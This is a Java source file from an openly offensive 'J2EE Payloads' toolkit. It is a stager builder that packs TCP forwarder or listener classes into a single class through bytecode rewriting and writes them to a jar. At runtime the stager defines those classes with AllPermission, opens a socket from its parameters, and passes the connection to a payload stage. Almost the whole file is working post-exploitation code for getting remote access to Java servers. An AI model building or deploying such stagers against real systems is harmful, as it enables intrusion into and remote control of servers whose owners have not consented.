/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.builder;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.Socket;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;

import javapayload.handler.stage.StageHandler;
import javapayload.stage.StreamForwarder;
import javapayload.stager.Stager;
import jtcpfwd.CustomLiteBuilder;
import jtcpfwd.Lookup;
import jtcpfwd.Module;
import jtcpfwd.forwarder.Forwarder;
import jtcpfwd.listener.Listener;

import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodAdapter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class JTCPfwdBuilder extends Stager {
	
	public static void main(String[] args) throws Exception {
		if (args.length != 2 || args[0].length() != 1 || "FL".indexOf(args[0]) == -1) {
			System.out.println("Usage: java j2eepayload.builder.JTCPfwdBuilder F|L <rule>");
			return;
		}
		boolean listener = args[0].equals("L");
		Module mainModule = Lookup.lookupClass(listener ? Listener.class : Forwarder.class, args[1]);
		HashSet /*<String>*/ classNameSet = new HashSet();
		CustomLiteBuilder.addRequiredClasses(new int[CustomLiteBuilder.BASECLASS.length], classNameSet, mainModule);
		mainModule.dispose();
		List /*<String>*/ classNames = new ArrayList(classNameSet);
		classNames.add(listener ? JTCPfwdListenerAdapter.class.getName() : JTCPfwdForwarderAdapter.class.getName());

		ByteArrayOutputStream classesOut = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(classesOut);
		for (int i = 0; i < classNames.size(); i++) {
			Class clazz = Class.forName((String)classNames.get(i));
			final InputStream classStream = StageHandler.class.getResourceAsStream("/" + clazz.getName().replace('.', '/') + ".class");
			final ByteArrayOutputStream baos = new ByteArrayOutputStream();
			StreamForwarder.forward(classStream, baos);
			final byte[] classBytes = baos.toByteArray();
			dos.writeInt(classBytes.length);
			dos.writeUTF(clazz.getName());
			dos.write(classBytes);
		}
		dos.writeInt(0);
		dos.close();
		embedIntoClass(listener?"javapayload/stager/JTCPfwdListener" : "javapayload/stager/JTCPfwdForwarder", classesOut.toByteArray());
	}


	protected static void embedIntoClass(final String classname, byte[] prependData) throws Exception {
		final ClassWriter cw = new ClassWriter(0);
		class MyMethodVisitor extends MethodAdapter {
			private final String newClassName;

			public MyMethodVisitor(MethodVisitor mv, String newClassName) {
				super(mv);
				this.newClassName = newClassName;
			}

			private String cleanType(String type) {
				if (type.equals("j2eepayload/builder/JTCPfwdBuilder")) {
					type = newClassName;
				}
				return type;
			}

			public void visitFieldInsn(int opcode, String owner, String name, String desc) {
				super.visitFieldInsn(opcode, cleanType(owner), name, desc);
			}

			public void visitMethodInsn(int opcode, String owner, String name, String desc) {
				super.visitMethodInsn(opcode, cleanType(owner), name, desc);
			}

			public void visitTypeInsn(int opcode, String type) {
				super.visitTypeInsn(opcode, cleanType(type));
			}
		}
		
		String prependDataString = new String(prependData, "ISO-8859-1");
		final List prependDataStrings = new ArrayList();
		final int MAXLEN = 65535;
		System.out.println("Encoding embed data...");
		while (prependDataString.length() > MAXLEN || getUTFLen(prependDataString) > MAXLEN) {
			System.out.println("Remaining embed data is "+prependDataString.length()+" bytes, needs splitting.");
			int len = Math.min(MAXLEN, prependDataString.length()), utflen;
			while ((utflen = getUTFLen(prependDataString.substring(0, len))) > MAXLEN) {
				len -= (utflen-MAXLEN+1)/2;
				System.out.println("Trying to encode "+len+" bytes");
			}
			prependDataStrings.add(prependDataString.substring(0, len));
			prependDataString=prependDataString.substring(len);
		}
		System.out.println("Remaining embed data is "+prependDataString.length()+" bytes.");
		prependDataStrings.add(prependDataString);
		System.out.println("Finished encoding embed data");
		final ClassVisitor integratorVisitor = new ClassAdapter(cw) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				if (!superName.equals("javapayload/stager/Stager") || !name.equals(JTCPfwdBuilder.class.getName().replace('.', '/')))
					throw new RuntimeException("Incompatible input class");
				super.visit(version, access, classname, signature, superName, interfaces);
			}

			public void visitInnerClass(String name, String outerName, String innerName, int access) {
				// do not copy inner classes
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				if (name.equals("bootstrap") || name.equals("<init>") || name.equals("findClass")) {
					return new MyMethodVisitor(super.visitMethod(access, name, desc, signature, exceptions), classname);
				} else if (name.equals("getEmbeddedClasses")) {
					MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions);
					mv.visitCode();
					for (int i = 0; i < prependDataStrings.size(); i++) {
						mv.visitLdcInsn((String)prependDataStrings.get(i));
						if (i != 0) {
							mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "concat", "(Ljava/lang/String;)Ljava/lang/String;");
						}
					}
					mv.visitInsn(Opcodes.ARETURN);
					mv.visitMaxs(3, 1);
					mv.visitEnd();
					return null;
				} else {
					return null;
				}
			}

			public void visitOuterClass(String owner, String name, String desc) {
				// do not copy outer classes
			}
		};
		final InputStream is = JTCPfwdBuilder.class.getResourceAsStream("/" + JTCPfwdBuilder.class.getName().replace('.', '/') + ".class");
		final ClassReader cr = new ClassReader(is);
		cr.accept(integratorVisitor, 0);
		is.close();
		final byte[] newBytecode = cw.toByteArray();
		Manifest manifest = new Manifest();
		manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
		final JarOutputStream jos = new JarOutputStream(new FileOutputStream("jtcpfwd-stager.jar"), manifest);
		jos.putNextEntry(new ZipEntry(classname+".class"));
		jos.write(newBytecode);
		jos.close();
	}

	private static int getUTFLen(String str) {
		int utflen = 0;
		for (int i = 0; i < str.length(); i++) {
			char c = str.charAt(i);
			if ((c >= 0x0001) && (c <= 0x007F)) {
				utflen++;
			} else if (c > 0x07FF) {
				throw new IllegalStateException();
			} else {
				utflen += 2;
			}
		}
		return utflen;
	}
	
	private String getEmbeddedClasses() {
		return "TO_BE_REPLACED";
	}
	
	private Map /*<String,byte[]>*/ classCache;
	private ProtectionDomain pd;
	
	public void bootstrap(String[] parameters) throws Exception {
		final DataInputStream in = new DataInputStream(new ByteArrayInputStream(getEmbeddedClasses().getBytes("ISO-8859-1")));
		final Permissions permissions = new Permissions();
		permissions.add(new AllPermission());
		pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
		classCache = new HashMap();
		String className;
		int length = in.readInt();
		do {
			className = in.readUTF(); 
			final byte[] classfile = new byte[length];
			in.readFully(classfile);
			classCache.put(className, classfile);
			length = in.readInt();
		} while (length > 0);
		Class clazz = findClass(className);
		resolveClass(clazz);
		final Socket s = (Socket) clazz.getMethod("getSocket", new Class[] {Class.forName("java.lang.String")}).invoke(null, new String[] {parameters[1]});
		bootstrap(s.getInputStream(), s.getOutputStream(), parameters);
	}
	
	protected Class findClass(String name) throws ClassNotFoundException {
		byte[] classfile = (byte[]) classCache.get(name);
		if (classfile == null)
			return super.findClass(name);
		return defineClass(null, classfile, 0, classfile.length, pd);
	}
}